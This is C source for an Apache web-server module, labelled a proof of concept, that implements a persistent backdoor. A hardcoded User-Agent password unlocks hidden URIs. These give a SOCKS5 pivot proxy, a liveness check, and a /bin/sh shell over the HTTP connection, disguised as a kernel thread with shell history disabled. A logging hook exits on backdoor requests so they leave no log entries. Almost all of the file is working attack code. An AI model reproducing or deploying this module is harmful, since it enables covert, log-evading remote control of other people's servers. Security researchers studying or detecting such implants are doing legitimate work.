//Socks5 code from https://github.com/fgssfgss/socks_proxy

/* Ringbuilder PoC (@TheXC3LL) */

#include <sys/types.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/fcntl.h>
#include <netdb.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <dirent.h>
#include <sys/un.h>

#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "http_log.h"
#include "ap_config.h"


#include "mod_ringbuilder.h"


#define BUFSIZE 65536
#define IPSIZE 4
#define ARRAY_SIZE(x) (sizeof(x) / sizeof(x[0]))


#define PASSWORD "1w4NN4b3Y0uRd0g"
#define SOCKSWORD "/w41t1ngR00M"
#define PINGWORD "/h0p3"
#define SHELLWORD "/s4L4dD4ys"
#define IPC "/tmp/mod_ringbuilder" //Change

pid_t pid;

enum socks {
	RESERVED = 0x00,
	VERSION = 0x05
};

enum socks_auth_methods {
	NOAUTH = 0x00,
	USERPASS = 0x02,
	NOMETHOD = 0xff
};

enum socks_auth_userpass {
	AUTH_OK = 0x00,
	AUTH_VERSION = 0x01,
	AUTH_FAIL = 0xff
};

enum socks_command {
	CONNECT = 0x01
};

enum socks_command_type {
	IP = 0x01,
	DOMAIN = 0x03
};

enum socks_status {
	OKH = 0x00,
	FAILED = 0x05
};


int readn(int fd, void *buf, int n)
{
	int nread, left = n;
	while (left > 0) {
		if ((nread = read(fd, buf, left)) == 0) {
			return 0;
		} else if (nread != -1){
			left -= nread;
			buf += nread;
		}
	}
	return n;
}


void socks5_invitation(int fd) {
	char init[2];
	readn(fd, (void *)init, ARRAY_SIZE(init));
	if (init[0] != VERSION) {
		exit(0);
	}
}

void socks5_auth(int fd) {
		char answer[2] = { VERSION, NOAUTH };
		write(fd, (void *)answer, ARRAY_SIZE(answer));
}

int socks5_command(int fd)
{
	char command[4];
	readn(fd, (void *)command, ARRAY_SIZE(command));
	return command[3];
}

char *socks5_ip_read(int fd)
{
	char *ip = malloc(sizeof(char) * IPSIZE);
	read(fd, (void* )ip, 2); //Buggy
	readn(fd, (void *)ip, IPSIZE);
	return ip;
}

unsigned short int socks5_read_port(int fd)
{
	unsigned short int p;
	readn(fd, (void *)&p, sizeof(p));
	return p;
}

int app_connect(int type, void *buf, unsigned short int portnum, int orig) {
	int new_fd = 0;
	struct sockaddr_in remote;
	char address[16];

	memset(address,0, ARRAY_SIZE(address));
	new_fd = socket(AF_INET, SOCK_STREAM,0);
	if (type == IP) {
		char *ip = NULL;
		ip = buf;
		snprintf(address, ARRAY_SIZE(address), "%hhu.%hhu.%hhu.%hhu",ip[0], ip[1], ip[2], ip[3]);
		memset(&remote, 0, sizeof(remote));
		remote.sin_family = AF_INET;
		remote.sin_addr.s_addr = inet_addr(address);
		remote.sin_port = htons(portnum);

		if (connect(new_fd, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
			return -1;
		}
		return new_fd;
	}
}

void socks5_ip_send_response(int fd, char *ip, unsigned short int port)
{
	char response[4] = { VERSION, OK, RESERVED, IP };
	write(fd, (void *)response, ARRAY_SIZE(response));
	write(fd, (void *)ip, IPSIZE);
	write(fd, (void *)&port, sizeof(port));
}


void app_socket_pipe(int fd0, int fd1)
{
	int maxfd, ret;
	fd_set rd_set;
	size_t nread;
	char buffer_r[BUFSIZE];

	maxfd = (fd0 > fd1) ? fd0 : fd1;
	while (1) {
		FD_ZERO(&rd_set);
		FD_SET(fd0, &rd_set);
		FD_SET(fd1, &rd_set);
		ret = select(maxfd + 1, &rd_set, NULL, NULL, NULL);

		if (ret < 0 && errno == EINTR) {
			continue;
		}

		if (FD_ISSET(fd0, &rd_set)) {
			nread = recv(fd0, buffer_r, BUFSIZE, 0);
			if (nread <= 0)
				break;
			send(fd1, (const void *)buffer_r, nread, 0);
		}

		if (FD_ISSET(fd1, &rd_set)) {
			nread = recv(fd1, buffer_r, BUFSIZE, 0);
			if (nread <= 0)
				break;
			send(fd0, (const void *)buffer_r, nread, 0);
		}
	}
}

void *worker(int fd) {
	int inet_fd = -1;
	int command = 0;
	unsigned short int p = 0;

	socks5_invitation(fd);
	socks5_auth(fd);
	command = socks5_command(fd);
	if (command == IP) {
		char *ip = NULL;
		ip = socks5_ip_read(fd);
		p = socks5_read_port(fd);
		inet_fd = app_connect(IP, (void *)ip, ntohs(p), fd);
		if (inet_fd == -1) {
			exit(0);
		}
		socks5_ip_send_response(fd, ip, p);
		free(ip);
    } 

	app_socket_pipe(inet_fd, fd);
	close(inet_fd);
	exit(0);
}


void shell(int socket) {
	int input[2];
	int output[2];
	int n, sr;
	char buf[1024];
	fd_set readset;
	struct timeval tv;
	pid_t spid;

	pipe(input);
	pipe(output);

	spid = fork();
	if (spid == 0) {
		char *argv[] = { "[kintegrityd/2]", 0 };
        char *envp[] = { "HISTFILE=", 0 };
		close(input[1]);
		close(output[0]);
		
		dup2(socket, 0);
		dup2(socket, 1);
		dup2(socket, 2);
		execve("/bin/sh", argv, envp);
	} 
	return;
}



static int ringbuilder_post_read_request(request_rec *r) {
	int fd, sock, n, sr;
	fd_set readset;
	struct sockaddr_un server;
	struct timeval tv;
	
	apr_socket_t *client_socket;
	extern module core_module;

	const apr_array_header_t *fields;
    int i;
    apr_table_entry_t *e = 0;

	int backdoor = 0;
	
	fields = apr_table_elts(r->headers_in);
	e = (apr_table_entry_t *) fields->elts;
	for(i = 0; i < fields->nelts; i++) {
		if (!strcmp(e[i].key,"User-Agent")) {
			if (!strcmp(e[i].val, PASSWORD)) {
				backdoor = 1;
			}
		}
	}
	
	if (backdoor == 0) {
		return DECLINED;
	}

	client_socket = ap_get_module_config(r->connection->conn_config, &core_module);
	if (client_socket) {
		fd = client_socket->socketdes;
	}
	
	if (!strcmp(r->uri, SOCKSWORD)) {
		worker(fd);
		exit(0);
	}
	if (!strcmp(r->uri, PINGWORD)) {
		write(fd, "Alive!", strlen("Alive!"));
		exit(0);
	}	
	if (!strcmp(r->uri, SHELLWORD)) {
		if (pid) {
			char buf[1024];
			int sd[2], i;

			sock = socket(AF_UNIX, SOCK_STREAM, 0);
			if (sock < 0) {
				write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
				exit(0);
			}
			server.sun_family = AF_UNIX;
			strcpy(server.sun_path, IPC);
			if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
				close(sock);
				write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
				exit(0);
			}
			write(sock, "SHELL\n", strlen("SHELL\n") + 1);
			write(fd, "[+] Shell Mode\n", strlen("[+] Shell Mode\n") +1);
			sd[0] = sock;
			sd[1] = fd;

			while (1){
				for(i = 0; i < 2; i++) { 	
					tv.tv_sec = 2;
					tv.tv_usec = 0;
					FD_ZERO(&readset);
					FD_SET(sd[i], &readset);
					sr = select(sock + 1, &readset, NULL, NULL, &tv);
					if (sr) {
						if (FD_ISSET(sd[i], &readset)) {
							memset(buf, 0, 1024);
							n = read(sd[i], buf, 1024);
							if (i == 0) {
								if (n <= 0) {
									write(fd, "ERRIPC\n", strlen("ERRIPC\n") + 1);
									exit(0);
								}
								write(fd, buf, strlen(buf) + 1);
							}
							else {
								if (n > 0) {	
									write(sock, buf, strlen(buf) + 1);
								}
								else {
									exit(0);
								}
							}
						}
					}
				}
			}
			exit(0);
		}
	}	

	return DECLINED;
}

ringbuilder_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
	pid = fork();

	if (pid) {
		return OK;
	}
	
	int master, i, rc, max_clients = 30, clients[30], new_client, max_sd, sd;
	struct sockaddr_un serveraddr;
	char buf[1024];
	fd_set readfds;

	for (i = 0; i < max_clients; i++) {
		clients[i] = 0;
	}

	master = socket(AF_UNIX, SOCK_STREAM, 0);
	if (sd < 0) {
		exit(0);
	}
	memset(&serveraddr, 0, sizeof(serveraddr));
	serveraddr.sun_family = AF_UNIX;
	strcpy(serveraddr.sun_path, IPC);
	rc = bind(master, (struct sockaddr *)&serveraddr, SUN_LEN(&serveraddr));
	if (rc < 0) {
		exit(0);
	}
	listen(master, 5);
	chmod(serveraddr.sun_path, 0777);
	while(1) {
		FD_ZERO(&readfds);
		FD_SET(master, &readfds);
		max_sd = master;

		for (i = 0; i < max_clients; i++) {
			sd = clients[i];
			if (sd > 0) {
				FD_SET(sd, &readfds);
			}
			if (sd > max_sd) {
				max_sd = sd;
			}
		}
		select (max_sd +1, &readfds, NULL, NULL, NULL);	
		if (FD_ISSET(master, &readfds)) {
			new_client = accept(master, NULL, NULL);
			for (i = 0; i < max_clients; i++) {
				if (clients[i] == 0) {
					clients[i] = new_client;
					break;
				}
			}
		}

		for (i = 0; i < max_clients; i++) {
			sd = clients[i];
			if (FD_ISSET(sd, &readfds)) {
				memset(buf, 0, 1024);
				if ((rc = read(sd, buf, 1024)) <= 0) {
					close(sd);
					clients[i] = 0;
				}
				else  {
					if (strstr(buf, "SHELL")){
						shell(sd);
					}
				}
			} 
		}
	}
}

static int ringbuilder_log_transaction(request_rec *r) {
	const apr_array_header_t *fields;
    int i;
    apr_table_entry_t *e = 0;

	int backdoor = 0;
	
	fields = apr_table_elts(r->headers_in);
	e = (apr_table_entry_t *) fields->elts;
	for(i = 0; i < fields->nelts; i++) {
		if (!strcmp(e[i].key,"User-Agent")) {
			if (!strcmp(e[i].val, PASSWORD)) {
				backdoor = 1;
			}
		}
	}
	
	if (backdoor == 0) {
		return DECLINED;
	}
	exit(0);

}

static void ringbuilder_register_hooks(apr_pool_t *p){
	ap_hook_post_read_request((void *) ringbuilder_post_read_request, NULL, NULL, APR_HOOK_FIRST);
	ap_hook_post_config((void *) ringbuilder_post_config, NULL, NULL, APR_HOOK_FIRST);
	ap_hook_log_transaction(ringbuilder_log_transaction, NULL, NULL, APR_HOOK_FIRST);
}

module AP_MODULE_DECLARE_DATA ringbuilder_module = {
    STANDARD20_MODULE_STUFF,
    NULL,			/* create per-dir    config structures */
    NULL,			/* merge  per-dir    config structures */
    NULL,			/* create per-server config structures */
    NULL,			/* merge  per-server config structures */
    NULL,			/* table of config file commands       */
    ringbuilder_register_hooks	/* register hooks                      */
};
